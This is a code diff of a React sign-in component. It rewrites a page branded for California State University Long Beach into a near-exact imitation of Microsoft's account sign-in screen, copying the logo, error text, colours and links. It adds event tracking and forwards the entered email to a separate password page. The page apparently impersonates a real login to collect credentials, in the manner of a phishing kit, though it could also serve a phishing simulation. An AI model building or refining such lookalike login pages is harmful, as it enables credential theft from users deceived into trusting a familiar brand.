@@ -1,98 +1,112 @@
-import { ImageWithFallback } from './figma/ImageWithFallback';
-import logoImage from '../../imports/Screenshot_20260410_191521_Drive.jpg';
 import { useNavigate } from 'react-router';
-import { KeyRound } from 'lucide-react';
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
+import { trackEvent } from '../api';
+import { MsPage, SsoCard, SsoButton } from './SsoLayout';
+import msLogo from '../../assets/ms-logo.svg';
 
 export function SignIn() {
   const navigate = useNavigate();
   const [email, setEmail] = useState('');
+  const [error, setError] = useState('');
+
+  useEffect(() => {
+    trackEvent('sign_in_view');
+  }, []);
 
   const handleNext = () => {
-    // Basic email validation
-    if (email.trim() && email.includes('@')) {
-      navigate(`/password?email=${encodeURIComponent(email)}`);
+    if (!email.trim() || !email.includes('@')) {
+      setError('Enter a valid email address, phone number, or Skype name.');
+      return;
     }
+    navigate(`/password?email=${encodeURIComponent(email)}`);
+  };
+
+  const handleKeyDown = (e: React.KeyboardEvent) => {
+    if (e.key === 'Enter') handleNext();
   };
 
   return (
-    <div className="min-h-screen bg-white">
-      {/* Header with Logo */}
-      <div className="p-6">
-        <ImageWithFallback
-          src={logoImage}
-          alt="California State University Long Beach"
-          className="h-16 w-auto object-contain"
-        />
-      </div>
+    <MsPage>
+      <SsoCard>
+        <div className="sso-page-content" style={{ padding: '44px' }}>
+          {/* Microsoft Logo */}
+          <img src={msLogo} alt="Microsoft" style={{ height: '24px', marginBottom: '16px' }} />
 
-      {/* Main Content */}
-      <div className="px-6 py-8 max-w-2xl">
-        <h1 className="text-4xl font-normal mb-8">Sign in</h1>
+          {/* Heading */}
+          <h1 style={{ fontSize: '24px', fontWeight: 600, margin: '16px 0 12px', lineHeight: '28px', color: '#1b1b1b' }}>
+            Sign in
+          </h1>
 
-        {/* Email Input */}
-        <div className="mb-6">
-          <input
-            type="text"
-            value={email}
-            onChange={(e) => setEmail(e.target.value)}
-            placeholder="Email, phone, or Skype"
-            className="w-full border-b-2 border-blue-600 pb-2 text-base focus:outline-none placeholder:text-gray-500"
+          {/* Error */}
+          {error && (
+            <div style={{ color: '#e81123', fontSize: '13px', marginBottom: '12px' }}>{error}</div>
+          )}
+
+          {/* Email Input */}
+          <div style={{ marginBottom: '16px' }}>
+            <input
+              type="text"
+              value={email}
+              onChange={(e) => { setEmail(e.target.value); setError(''); }}
+              onKeyDown={handleKeyDown}
+              placeholder="Email, phone, or Skype"
+              autoFocus
+              style={{
+                width: '100%',
+                fontSize: '15px',
+                padding: '6px 10px 6px 0',
+                border: 'none',
+                borderBottom: `1px solid ${error ? '#e81123' : '#666'}`,
+                outline: 'none',
+                color: '#1b1b1b',
+                backgroundColor: 'transparent',
+                boxSizing: 'border-box',
+                fontFamily: 'inherit',
+                height: '36px',
+              }}
+            />
+          </div>
+
+          {/* Links */}
+          <div style={{ fontSize: '13px', marginBottom: '4px' }}>
+            <span>No account? </span>
+            <a href="#" style={{ color: '#0067b8' }}>Create one!</a>
+          </div>
+          <div style={{ fontSize: '13px', marginBottom: '20px' }}>
+            <a href="#" style={{ color: '#0067b8' }}>Can't access your account?</a>
+          </div>
+
+          {/* Next Button */}
+          <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
+            <SsoButton onClick={handleNext}>Next</SsoButton>
+          </div>
+        </div>
+      </SsoCard>
+
+      {/* Sign-in options (below card, separate section) */}
+      <div
+        style={{
+          width: '440px',
+          maxWidth: '440px',
+          backgroundColor: '#fff',
+          boxShadow: '0 2px 6px rgba(0,0,0,0.2)',
+          padding: '12px 44px',
+          marginTop: '1px',
+          display: 'flex',
+          alignItems: 'center',
+          gap: '12px',
+          cursor: 'pointer',
+          boxSizing: 'border-box',
+        }}
+      >
+        <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+          <path
+            d="M10 2C7.79 2 6 3.79 6 6C6 8.21 7.79 10 10 10C12.21 10 14 8.21 14 6C14 3.79 12.21 2 10 2ZM10 8.5C8.62 8.5 7.5 7.38 7.5 6C7.5 4.62 8.62 3.5 10 3.5C11.38 3.5 12.5 4.62 12.5 6C12.5 7.38 11.38 8.5 10 8.5ZM4 15V16H16V15C16 12.33 10.67 11 10 11C9.33 11 4 12.33 4 15Z"
+            fill="#706D6B"
           />
-        </div>
-
-        {/* Reset Password Link */}
-        <a href="#" className="text-blue-600 hover:underline inline-block mb-8">
-          Reset my password
-        </a>
-
-        {/* Action Buttons */}
-        <div className="flex justify-end gap-3 mb-8">
-          <button
-            onClick={() => navigate('/')}
-            className="px-8 py-3 bg-gray-300 hover:bg-gray-400 text-black"
-          >
-            Back
-          </button>
-          <button
-            onClick={handleNext}
-            className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white disabled:opacity-50"
-            disabled={!email.trim() || !email.includes('@')}
-          >
-            Next
-          </button>
-        </div>
-
-        {/* Help Information Box */}
-        <div className="bg-gray-100 p-4 mb-8">
-          <p className="text-sm text-gray-800">
-            For assistance, please contact the{' '}
-            <a href="#" className="text-blue-600 hover:underline">
-              Technology Help Desk
-            </a>
-            . By using this service, you acknowledge and agree to the{' '}
-            <a href="#" className="text-blue-600 hover:underline">
-              Information Security and Acceptable Use
-            </a>
-            {' '}policies.
-          </p>
-        </div>
-
-        {/* Sign-in Options */}
-        <button className="flex items-center gap-3 py-4 px-4 border border-gray-300 hover:bg-gray-50 w-full">
-          <KeyRound className="w-5 h-5 text-gray-700" />
-          <span className="text-gray-900">Sign-in options</span>
-        </button>
+        </svg>
+        <span style={{ fontSize: '15px', color: '#1b1b1b' }}>Sign-in options</span>
       </div>
-
-      {/* Footer */}
-      <div className="fixed bottom-8 left-0 right-0 px-6">
-        <div className="flex items-center gap-6 text-sm text-gray-600">
-          <a href="#" className="hover:text-gray-900">Acceptable Use</a>
-          <a href="#" className="hover:text-gray-900">Accessibility Statement</a>
-          <button className="hover:text-gray-900">•••</button>
-        </div>
-      </div>
-    </div>
+    </MsPage>
   );
 }
